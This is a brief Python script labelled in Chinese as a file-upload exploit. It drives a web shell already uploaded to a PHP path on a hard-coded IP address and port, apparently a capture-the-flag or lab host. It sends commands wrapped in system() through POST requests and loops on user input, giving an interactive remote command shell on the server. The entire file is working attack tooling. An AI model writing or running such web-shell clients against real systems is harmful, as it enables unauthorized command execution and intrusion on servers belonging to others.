"""
文件上传EXP
"""
import requests

url = 'http://120.25.24.45:31626/uploads/123.php'
cmd = "whoami"
while cmd:
    payload = {
            'cmd':'system("%s");'%cmd
        }
    res = requests.post(url, data=payload)
    print(res.text.strip())
    cmd = input('cmd>>>')